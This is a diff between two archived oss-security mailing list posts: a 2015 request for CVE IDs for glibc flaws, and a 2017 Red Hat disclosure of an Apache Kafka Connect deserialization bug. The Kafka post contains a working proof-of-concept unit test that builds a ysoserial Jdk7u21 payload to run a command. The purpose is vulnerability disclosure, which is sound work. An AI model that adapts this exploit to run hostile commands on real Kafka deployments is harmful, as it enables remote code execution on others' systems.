@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2475" "Tuesday" "3" "November" "2015" "15:53:22" "+0100" "Raphael Hertzog" "hertzog@debian.org" "<20151103145322.GA23043@home.ouaza.com>" "68" "[oss-security] Re: Pending CVE requests for glibc" nil nil nil "11" "2015110314:53:22" "[oss-security] Re: Pending CVE requests for glibc" (number mark "U       hertzog@debi Nov  3   68/2475  " thread-indent "\"[oss-security] Re: Pending CVE requests for glibc\"\n") "<55EE8F1C.605@redhat.com>" ("<55EE8F1C.605@redhat.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2350" "Wednesday" "19" "July" "2017" "09:41:16" "+1000" "Hooman Ghasem Broujerdi" "hghasemb@redhat.com" "<CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>" "71" "[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" nil nil nil "7" "2017071823:41:16" "[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime" (number mark "U       hghasemb@red Jul 19   71/2350  " thread-indent "\"[oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7992 invoked by uid 550); 3 Nov 2015 14:57:41 -0000
+Received: (qmail 30462 invoked by uid 550); 19 Jul 2017 00:51:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,88 +12,97 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 6116 invoked from network); 3 Nov 2015 14:53:34 -0000
-Date: Tue, 3 Nov 2015 15:53:22 +0100
-From: Raphael Hertzog <hertzog@debian.org>
-To: oss-security@lists.openwall.com
-Cc: Mitre CVE assign department <cve-assign@mitre.org>
-Message-ID: <20151103145322.GA23043@home.ouaza.com>
-References: <55EE8F1C.605@redhat.com>
+Received: (qmail 25607 invoked from network); 18 Jul 2017 23:41:28 -0000
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=1fXKTjDkvpM2vNNiS2dnvBdrz+dsIejEcGk2akTIuYI=;
+        b=kEHLk9tFmf2O1fJYpYzB4KaUpabJx9BpmWI8x4UaKJeeI9XgkZ8w4CAPesJ01JZAeN
+         4iE5TOEDL2NdBh5WswG7RFYJltDACu7EgPocCh8ubCPkD1sAEcVFur/QjGyl8Z4tK+sv
+         gEjcvDwlSUG/gVlmrkGrwcGzOdpMqt5zHJFVVoxAqUrD25KEVA3uZ/qf3rNEUSPDvJft
+         RF1XswYi3055ng8MKlAOxBB18lck13gV3ObNJUErPCPRjdIo/fLfSiUwRetE8ANhFStD
+         sQSFiqAf8s3oA1jJ/Lyz6M90COqtSAr0hRx6YAsmqaX7WJm7aIi8nI9PlPasynWDE4Zi
+         vrVA==
+X-Gm-Message-State: AIVw112j1JzjVNOkUnssMkCJPUuMzW3SOqqr6rKTY+aYaVS8OV8/eWJU
+	V+2iaGRXDDC5BEPx0q5VlouhQkbk1VgDI0o=
+X-Received: by 10.55.8.139 with SMTP id 133mr153182qki.22.1500421276597; Tue,
+ 18 Jul 2017 16:41:16 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <55EE8F1C.605@redhat.com>
-User-Agent: Mutt/1.5.24 (2015-08-30)
-X-Virus-Scanned: clamav-milter 0.98.7 at mail
-X-Virus-Status: Clean
-Subject: [oss-security] Re: Pending CVE requests for glibc
+From: Hooman Ghasem Broujerdi <hghasemb@redhat.com>
+Date: Wed, 19 Jul 2017 09:41:16 +1000
+Message-ID: <CAP-Z0sg3q0n9AU=vE0KGFcK14DpY+9inZaosScoSC8DdcWVRjA@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="001a114c55463497aa0554a00db6"
+Subject: [oss-security] CVE-IDs request for Apache Kafka desrialization vulnerability via runtime
 
-Hello,
+--001a114c55463497aa0554a00db6
+Content-Type: text/plain; charset="UTF-8"
 
-it seems that this CVE request fell through the cracks. Can you
-please assign the requested CVE ids?
+Hi,
 
-Thank you very much.
+Apache kafka connect-api runtime contains a desrialization vul via
+FileOffsetBackingStore
+which leads to remote code execution, this can be exploited reliably in
+JDK1.7.0_05, below is
+a unit test for it:
 
-Le mardi 08 septembre 2015, Huzaifa Sidhpurwala a écrit :
-> Hi MITRE,
-> 
-> I could not help but notice, some glibc security issues were not
-> assigned CVE ids.
-> 
-> 1. glibc: multiple overflows in strxfrm()
-> Integer overflow when computing memory allocation sizes (similar to
-> CVE-2012-4412) was reported [1] in glibc strxfrm() function. Attached
-> strxfrm-int32.c should trigger this issue on a 32-bit systems.
-> Additionally, it was discovered [1] that strxfrm() falls back to an
-> unbounded alloca if malloc fails making it vulnerable to stack-based
-> buffer overflows (similar to CVE-2012-4424). Attached strxfrm-alloca.c
-> should trigger this issue.
-> 
-> Previously a request was made via:
-> http://seclists.org/oss-sec/2015/q1/540
-> 
-> 2. glibc: _IO_wstr_overflow integer overflow
-> An integer overflow flaw, leading to a heap-based buffer overflow, was
-> found in glibc's _IO_wstr_overflow() function. If an application used
-> this function, it could cause the application to crash or, potentially,
-> execute arbitrary code with the privileges of the user running the
-> application.
-> 
-> https://sourceware.org/bugzilla/show_bug.cgi?id=17269
-> https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=bdf1ff052a8e23d637f2c838fa5642d78fcedc33
-> 
-> 3. glibc: potential denial of service in internal_fnmatch()
-> It was reported [1] that when processing certain malformed patterns,
-> fnmatch can skip over the NUL byte terminating the pattern.  This can
-> potentially result in an application crash if fnmatch hits an unmapped
-> page before encountering a NUL byte.
-> 
-> https://sourceware.org/bugzilla/show_bug.cgi?id=18032
-> https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=4a28f4d55a6cc33474c0792fe93b5942d81bf185
-> 
-> Previously a request was made via:
-> http://seclists.org/oss-sec/2015/q1/689
-> 
-> 4. glibc: potential denial of service in pop_fail_stack()
-> A crash was reported [1] during glibc extended regular expression
-> processing. No known patch exists at the time of writing.
-> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=779392
-> 
-> 
-> Can MITRE please assign CVE ids to these flaws?
-> 
-> Thanks!
-> 
-> 
-> -- 
-> Huzaifa Sidhpurwala / Red Hat Product Security Team
-> 
-> 
 
--- 
-Raphaël Hertzog ◈ Writer/Consultant ◈ Debian Developer
+import junit.framework.Test;
+import junit.framework.TestCase;
+import junit.framework.TestSuite;
+import org.apache.commons.io.FileUtils;
+import org.apache.kafka.connect.runtime.standalone.StandaloneConfig;
+import org.apache.kafka.connect.storage.FileOffsetBackingStore;
+import ysoserial.payloads.Jdk7u21;
 
-Discover the Debian Administrator's Handbook:
-→ http://debian-handbook.info/get/
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.util.HashMap;
+import java.util.Map;
+
+public void test_Kafka_Deser() throws Exception {
+
+        StandaloneConfig config;
+
+        String projectDir = System.getProperty("user.dir");
+
+        Jdk7u21 jdk7u21 = new Jdk7u21();
+        Object o = jdk7u21.getObject("touch vul");
+
+        byte[] ser = serialize(o);
+
+        File tempFile = new File(projectDir + "/payload.ser");
+        FileUtils.writeByteArrayToFile(tempFile, ser);
+
+        Map<String, String> props = new HashMap<String, String>();
+        props.put(StandaloneConfig.OFFSET_STORAGE_FILE_FILENAME_CONFIG,
+tempFile.getAbsolutePath());
+        props.put(StandaloneConfig.KEY_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        props.put(StandaloneConfig.VALUE_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        props.put(StandaloneConfig.INTERNAL_KEY_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        props.put(StandaloneConfig.INTERNAL_VALUE_CONVERTER_CLASS_CONFIG,
+"org.apache.kafka.connect.json.JsonConverter");
+        config = new StandaloneConfig(props);
+
+        FileOffsetBackingStore restore = new FileOffsetBackingStore();
+        restore.configure(config);
+        restore.start();
+    }
+
+    private byte[] serialize(Object object) throws IOException {
+        ByteArrayOutputStream bout = new ByteArrayOutputStream();
+        ObjectOutputStream out = new ObjectOutputStream(bout);
+        out.writeObject(object);
+        out.flush();
+        return bout.toByteArray();
+    }
+
+Thanks,
+Hooman Broujerdi / Red Hat Product Security
+
+--001a114c55463497aa0554a00db6--
